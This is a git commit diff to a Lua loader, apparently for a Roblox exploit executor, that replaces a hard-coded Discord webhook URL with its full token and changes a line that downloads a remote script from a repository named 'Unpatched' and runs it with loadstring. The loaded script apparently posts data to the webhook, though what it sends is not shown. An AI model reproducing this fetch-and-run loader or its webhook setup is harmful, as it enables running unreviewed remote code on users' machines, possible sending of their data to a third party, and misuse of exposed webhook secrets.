20f3f9e4ca4ae70976b7b224c17512239a2f2e01
Proxy <99521865+SeasonalKirito@users.noreply.github.com>
2022-12-05 22:40:21 -0700

    Update Loader.lua

--- WebHook/Loader.lua
+++ WebHook/Loader.lua
@@ -1,3 +1,3 @@
-getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1036573911300710460/rmNSBMpEOW3qdQ-PMX4f6oRF3gEkhpJW1h_yAyNsnPkmWSgzpd4-CeWrcM-TyHYeQoX8"
+getgenv().DiscordWebhook = "https://discord.com/api/webhooks/1049560621504528395/InwFOKb9SoQPeL9hjaHJTv-rPuDlQaMEDblYelSjdOu4tyfNph1MHFZ7t6dwhs3e1zUF"
 
-loadstring(game:HttpGet("https://gist.githubusercontent.com/SeasonalKirito/4a0da539ab2137e4b7df68a797f71da7/raw/6f5d2ef793a178ca1c90591363946f602e26c5af/gistfile1.txt"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SeasonalKirito/Unpatched/main/WebHook/POST.lua"))();
